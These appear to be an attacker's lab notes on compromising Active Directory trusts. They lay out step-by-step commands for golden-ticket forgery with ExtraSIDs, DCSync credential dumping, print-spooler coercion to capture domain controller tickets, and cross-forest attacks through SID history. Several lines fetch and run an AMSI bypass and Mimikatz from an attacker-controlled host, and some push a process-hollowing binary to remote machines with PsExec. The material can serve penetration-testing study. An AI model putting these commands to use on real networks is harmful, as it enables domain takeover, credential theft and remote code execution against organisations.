### Theory & Enumeration
    //Theory:
        //allows domains to extend Kerberos authentication to each other - TGT from A is valid in B if B trusts A
        //can be one-way or two-way
        //tree structure - common
            //trust is transitive
        **Target: Enterprise Admins
    //Enumeration Trusts:
        //Method 1:  nltest /trusted_domains
            //Primary Domain = current domain
            //Direct Outbound & Direct Inbound = bidirectional trust
        //Method 2:  ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
        //Method 3 - PowerView:  Get-DomainTrust -API
            //From that next domain (if it isn't root):  Get-DomainTrust -API -Domain <abc.com>
        //Method 4:  Get-DomainTrust
        //Further enum w/ PowerView:
            ex.  Get-DomainUser -Domain corp1.com;  Get-NetGroupMember -GroupName "Enterprise Admins"

### Exploiting within a Forest
**Should be possible by default**
**WITHIN A FOREST - EX. ops.abc.com and abc.com - NOT abcedge.com and abc.com**

    //Exploitation:
        //Method 1: After compromising current domain, can create Enterprise Admin golden ticket via ExtraSID feature
        //Method 2: If local admin on server with Unconstrained Delegation, use Rubeus & PrintSpoofer to exploit new DC
        //Method 3: If no server w/ UD (but have domain admin), add a UD server and use PrintSpoofer exploit

    1. Owning the Forest w/ Extra SIDs - getting to Enterprise Admin via golden ticket:
        //If we compromise the krbtgt account password of our current domain, we can craft a golden ticket that contains an ExtraSid with group membership of Enterprise Admins.
        //assuming we've already compromised the current domain, we can create a TGT w/ group memberships from other domains
            //the ExtraSids field within the KERB_VALIDATION_INFO structure includes SIDs that originate in a foreign domain and show membership in a trusted domain
        //in a trust relationsip, each domain has a computer account with the name of the trusted other domain
            //the shared secret is the password hash of this account - same for both sides - used to encrypt the TGT instead of krbtgt hash
        //Dumping the shared secret/hash:
            lsadump::dcsync /domain:prod.corp1.com /user:corp1$

        //Steps:
            1. Get krbtgt hash via DCSync:
                lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
            2. Get domain SIDs for both domains:
                (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/amsi.txt') | IEX
                (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/PowerView.ps1') | IEX
                Get-DomainSID -Domain prod.corp1.com
                Get-DomainSID -Domain corp1.com
            3. Create golden ticket:
                (append 519 to sid for other domain)
                //username doesn't have to be valid - 519 makes us an enterprise admin
                // /domain is origin domain
                \\192.168.49.121\visualstudio\mimikatz.exe
                kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
                //Test:
                    c:\tools\SysinternalsSuite\PsExec.exe \\rdc01 cmd; whoami /all
                //Mimikatz in memory:
                    (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/amsi.txt') | IEX
                    (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/Invoke-Mimikatz10.ps1') | IEX
                    Invoke-Mimikatz -Command '"kerberos::golden /user:h4x /domain:ops.abc.com /sid:S-1-5-21-2032401531-514583578-4118054891 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-519 /ptt" "exit"'
                //RCE:
                    copy \\192.168.49.121\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe \\rdc02.abc.com\c$\windows\tasks
                    \\192.168.49.121\visualstudio\sysinternals\PsExec64.exe -accepteula \\rdc02.abc.com "c:\windows\tasks\Hollow.exe"

        //Other Method using Trust key:
            https://medium.com/r3d-buck3t/breaking-domain-trusts-with-forged-trust-tickets-5f03fb71cd72
            Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc-name
            Invoke-Mimikatz -Command '"Kerberos::golden /user: Administrator /domain: dollarcorp.moneycorp.local [child_domain] /sid: DomainAdmin_SID /sids: Enterprise_Admin_SID /rc4: Ticket HASH /service:krbtgt /target:moneycorp.local [root domain] /ticket: location to save the ticket"'
            Rubeus.exe asktgs /ticket: ticket Location /service: service type [cifs/mcorpdc.moneycorp.local] /dc: domain controller [mcorp-dc.moneycorp.local] /ptt
            dir \\mcorp-dc.moneycorp.local\c$
            
    2. Owning the Forest w/ Printers:
        //requires a server w/ Unconstrained Delegation
        //doesn't require Domain Admin (just local) - unless there's no UD server (then we could add one)
        //Steps:
            1. Confirm access to tgt DC spooler in other domain:
                ls \\rdc01\pipe\spoolss
            2. Start ticket monitor:
                Rubeus.exe monitor /interval:5 /filteruser:RDC01$
            3. Force print connection:
                .\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com
            4. Use TGT:
                Rubeus.exe ptt /ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+...
                    (can't use DC computer account for RCE, but can use it for AD replication via DCSync to get admin's hash)
                lsadump::dcsync /domain:corp1.com /user:corp1\administrator

        **if we obtain Domain Admin privileges in prod.corp1.com through some other vector, we could configure a server with unconstrained Kerberos delegation and use that to compromise any other domain in the forest.

### Exploiting Additional Forests
**Forest is a trust boundary - typically requires misconfigurations to exploit!**

    //Enumeration:
        1. AD Trust Between Forests:
            //similar to that between domains, but can be restricted if selective authentication is configured
        2. Enumeration:
            1. Find Trusts:
                //Check for Trusts:
                    ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
                //Check for trusts in child domains of the other forest from corp1.com:
                    Get-DomainTrust -Domain corp1.com
                //*Automated:
                    Get-DomainTrustMapping
            2. Enumerate users/groups/etc. in the trusted forest:
                Get-DomainUser -Domain corp2.com | select name
                //***Look for users with same accounts in different forests - could share creds - service accts or regular users
                //****Look for foreign group membership of local users:
                    Get-DomainForeignGroupMember
                    Get-DomainForeignGroupMember -Domain <otherDomain>
                        convertfrom-sid S-1-5-21-3776646582-2086779273-4091361643-1601
                    //If we compromise the local user, we could gain access to the other forest (corp2.com)

    **a trust means auth requests are forwarded between them
    **External trusts enforce SID filtering - but you can still query AD in the other domain even if you can't exploit

    //Exploitation:
            //forest trust is supposed to be a security boundary, unlike domain trust
                //by default it is not possible to compromise a trusted forest even if we have completely compromised our current forest
        1. Extra SIDs:
            //SID Filtering prevents the cross-domain attack, but it could be manually disabled (and SID History enabled)
                //Check if enabled:  netdom trust <current.Domain.com> /domain:<tgtDomain.com> /quarantine
            //To Weaken - Enable SID History:
                Get-DomainTrust -Domain corp2.com
                //From corp2.com DC:  netdom trust corp2.com /d:corp1.com /enablesidhistory:yes
                Get-DomainTrust -Domain corp2.com
            //Try the Attack:
                //only works against SIDs w/ RID >= 1000
                    //look for custom group whose membership will allow us to compromise a user or computer (ex. a non-default admin group):
                        Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com
                        //*the custom group must be a domain local security group, not a global security group (otherwise still filtered)
                lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt
                Get-DomainSID -domain corp1.com
                Get-DomainSID -domain corp2.com
                kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1095350385-1831131555-2412080359 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-4182647938-3943167060-1815963754-1106 /ptt        
                c:\tools\SysinternalsSuite\PsExec.exe \\dc01.corp2.com cmd
        2. Linked SQL Servers in the Forest:
            //Locating Servers:
                //In my domain (prod.corp1.com):  setspn -T prod -Q MSSQLSvc/*
                //In my forest (corp1.com):  setspn -T corp1 -Q MSSQLSvc/*
                //In another forest (corp2.com):  setspn -T corp2 -Q MSSQLSvc/*
            //Attempt to log in with SQL.exe ...
            //Check for links and follow the link - check for new privs like before